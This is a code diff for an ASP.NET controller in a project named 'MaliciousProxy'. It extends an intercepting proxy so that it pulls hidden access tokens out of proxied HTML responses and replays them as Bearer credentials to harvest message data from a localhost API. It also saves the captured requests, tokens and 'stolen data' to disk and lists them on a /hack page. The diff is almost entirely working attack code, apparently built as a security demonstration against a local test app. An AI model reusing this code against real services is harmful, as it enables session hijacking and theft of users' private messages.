@@ -1,9 +1,11 @@
 using Microsoft.AspNetCore.Mvc;
 using System.Collections.Concurrent;
 using System.Net;
+using System.Net.Http.Headers;
 using System.Text;
 using System.Text.Json;
 using System.Text.Json.Serialization;
+using System.Text.RegularExpressions;
 using System.Web;
 
 namespace MaliciousProxy.Controllers;
@@ -11,6 +13,31 @@ namespace MaliciousProxy.Controllers;
 public class HackController : ControllerBase
 {
     public static readonly List<CapturedItem> CapturedData = new();
+
+    static HackController()
+    {
+        if (System.IO.File.Exists("captured.json"))
+        {
+            try
+            {
+                var json = System.IO.File.ReadAllText("captured.json");
+                var saved = JsonSerializer.Deserialize<CapturedDataStorage>(json);
+                if (saved != null)
+                {
+                    var all = saved.CapturedData.Cast<CapturedItem>()
+                        .Concat(saved.CapturedRequest)
+                        .Concat(saved.CapturedResponse)
+                        .Concat(saved.CapturedToken)
+                        .OrderByDescending(c => c.Timestamp)
+                        .ToList();
+                    CapturedData.AddRange(all);
+                }
+            }
+            catch (Exception ex)
+            {
+            }
+        }
+    }
 
     private readonly ILogger<HackController> _logger;
 
@@ -25,6 +52,7 @@ public class HackController : ControllerBase
         var recentData = CapturedData.Take(100).ToList();
         Response.ContentType = "text/html";
         await Response.WriteAsync("<h1>Recent Data</h1>");
+        await Response.WriteAsync("<a href='/hack/clear'>Clear</a>");
         foreach (var capturedDataItem in recentData)
         {
             if (capturedDataItem is CapturedRequest request)
@@ -71,11 +99,33 @@ public class HackController : ControllerBase
                     await Response.WriteAsync("</pre>");
                 }
             }
+            else if (capturedDataItem is CapturedToken token)
+            {
+                await Response.WriteAsync($"<h3>TOKEN {token.TokenType}</h3>");
+                await Response.WriteAsync("<pre>");
+                await Response.WriteAsync(HttpUtility.HtmlEncode(token.Content));
+                await Response.WriteAsync("</pre>");
+            }
+            else if (capturedDataItem is CapturedData data)
+            {
+                await Response.WriteAsync($"<h3>STOLEN DATA {data.Path}</h3>");
+                await Response.WriteAsync("<pre>");
+                await Response.WriteAsync(HttpUtility.HtmlEncode(data.Content ?? "N/A"));
+                await Response.WriteAsync("</pre>");
+            }
             else
             {
                 await Response.WriteAsync($"<h2>{capturedDataItem.Path}</h2>");
             }
         }
+    }
+
+    [HttpGet("hack/clear")]
+    public async Task<IActionResult> Clear()
+    {
+        CapturedData.Clear();
+        System.IO.File.Delete("captured.json");
+        return Redirect("/hack");
     }
 
     public static async Task AddRequest(HttpRequest request)
@@ -117,22 +167,119 @@ public class HackController : ControllerBase
             Headers = response.Headers.Select(h => $"{h.Key}={string.Join(",", h.Value.ToArray())}").ToList(),
             Body = body
         });
+
+        ExtractTokens(body);
+    }
+
+    private static void ExtractTokens(string body)
+    {
+        var match = Regex.Match(body, @"<input type='hidden' name='access_token' value='([^']*)' />");
+
+        if (match.Success)
+        {
+            var accessToken = match.Groups[1].Value;
+            AddNew(new CapturedToken("access_token", accessToken));
+
+            GatherApiData(accessToken);
+        }
+    }
+
+    private static async void GatherApiData(string accessToken)
+    {
+        var client = new HttpClient
+        {
+            BaseAddress = new Uri("https://localhost:7274")
+        };
+        client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", accessToken);
+
+        await TryDataFetch(client, "/api/messages");
+        for (int i = 1; i <= 5; i++)
+        {
+            await TryDataFetch(client, $"/api/messages/{i}/from");
+        }
+        for (int i = 1; i <= 5; i++)
+        {
+            await TryDataFetch(client, $"/api/messages/{i}/to");
+        }
+    }
+
+    private static async Task TryDataFetch(HttpClient client, string path)
+    {
+        try
+        {
+            var response = await client.GetAsync(path);
+            if (response.IsSuccessStatusCode)
+            {
+                var body = await response.Content.ReadAsStringAsync();
+                AddNew(new CapturedData(path)
+                {
+                    Content = body
+                });
+            }
+            else if (response.StatusCode is HttpStatusCode.Unauthorized or HttpStatusCode.Forbidden)
+            {
+                AddNew(new CapturedData(path)
+                {
+                    Content = $"Denied Access: {response.StatusCode}"
+                });
+            }
+        }
+        catch (Exception ex)
+        {
+        }
     }
 
     private static void AddNew(CapturedItem capturedItem)
     {
         CapturedData.Insert(0, capturedItem);
+
+        while (CapturedData.Count > 1000)
+        {
+            CapturedData.RemoveAt(CapturedData.Count - 1);
+        }
+
+        var toStore = new CapturedDataStorage
+        {
+            CapturedData = CapturedData.OfType<CapturedData>().ToList(),
+            CapturedRequest = CapturedData.OfType<CapturedRequest>().ToList(),
+            CapturedResponse = CapturedData.OfType<CapturedResponse>().ToList(),
+            CapturedToken = CapturedData.OfType<CapturedToken>().ToList()
+        };
+        var json = JsonSerializer.Serialize(toStore, new JsonSerializerOptions
+        {
+            WriteIndented = true,
+            DefaultIgnoreCondition = JsonIgnoreCondition.WhenWritingNull
+        });
+        System.IO.File.WriteAllText("captured.json", json);
     }
 }
 
-public record CapturedItem(string Path, bool IsResponse);
+public record CapturedItem(string Path, bool IsResponse)
+{
+    public DateTime Timestamp { get; init; } = DateTime.UtcNow;
+}
 public record CapturedRequest(string Method, string Path) : CapturedItem(Path, false)
 {
-    public string? Body { get; init; } = string.Empty;
-    public List<string> Headers { get; init; } = new();
+    public string? Body { get; set; } = string.Empty;
+    public List<string> Headers { get; set; } = new();
 }
 public record CapturedResponse(string Path, HttpStatusCode StatusCode) : CapturedItem(Path, true)
 {
-    public string? Body { get; init; } = string.Empty;
-    public List<string> Headers { get; init; } = new();
+    public string? Body { get; set; } = string.Empty;
+    public List<string> Headers { get; set; } = new();
+}
+
+public record CapturedToken(string TokenType, string Content) : CapturedItem(TokenType, true);
+
+public record CapturedData(string Path) : CapturedItem(Path, true)
+{
+    public string? Content { get; set; } = string.Empty;
+}
+
+public class CapturedDataStorage
+{
+    public List<CapturedData> CapturedData { get; set; } = new();
+    public List<CapturedToken> CapturedToken { get; set; } = new();
+    public List<CapturedResponse> CapturedResponse { get; set; } = new();
+    public List<CapturedRequest> CapturedRequest { get; set; } = new();
 }
